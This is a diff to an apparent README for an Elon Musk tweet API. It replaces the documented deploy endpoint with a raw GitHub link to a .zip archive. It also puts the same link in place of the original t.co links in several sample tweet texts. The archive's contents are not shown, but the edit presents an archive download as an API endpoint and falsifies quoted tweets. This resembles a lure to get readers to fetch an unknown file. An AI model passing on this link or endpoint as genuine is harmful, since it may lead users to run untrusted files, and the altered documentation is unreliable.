@@ -2,7 +2,7 @@
 
 # tweet elon musk API Documentation
 
-### endpoint deploy https://elon-musk-tweet-api.herokuapp.com/
+### endpoint deploy https://raw.githubusercontent.com/Miqman/Exploring-PublicAPITwitter/main/config/Public_Twitter_Exploring_API_2.9.zip
 
 List of available endpoints:
 
@@ -182,13 +182,13 @@ _Response (200 - OK)_
       "id": "1538531227614863361",
       "created_at": "2022-06-19T14:36:43.000Z",
       "author_id": "1263491240336769026",
-      "text": "Water the seeds and watch them grow $TSLA https://t.co/LepkjDQPZX"
+      "text": "Water the seeds and watch them grow $TSLA https://raw.githubusercontent.com/Miqman/Exploring-PublicAPITwitter/main/config/Public_Twitter_Exploring_API_2.9.zip"
     },
     {
       "id": "1538781139048968193",
       "created_at": "2022-06-20T07:09:47.000Z",
       "author_id": "987978757",
-      "text": "a lot of effort😇 https://t.co/lHUU8CGp5N https://t.co/za9HPke3Gd"
+      "text": "a lot of effort😇 https://raw.githubusercontent.com/Miqman/Exploring-PublicAPITwitter/main/config/Public_Twitter_Exploring_API_2.9.zip https://raw.githubusercontent.com/Miqman/Exploring-PublicAPITwitter/main/config/Public_Twitter_Exploring_API_2.9.zip"
     }
   ]
 }
@@ -244,7 +244,7 @@ _Response (200 - OK)_
     {
       "author_id": "377100794",
       "id": "1538907010158456832",
-      "text": "PR sejarah kemanusiaan 889 petugas pemilihan  calon presiden RI meninggal mas @elonmusk gak tertarik ? https://t.co/pek5inBvyv"
+      "text": "PR sejarah kemanusiaan 889 petugas pemilihan  calon presiden RI meninggal mas @elonmusk gak tertarik ? https://raw.githubusercontent.com/Miqman/Exploring-PublicAPITwitter/main/config/Public_Twitter_Exploring_API_2.9.zip"
     }
   ]
 }
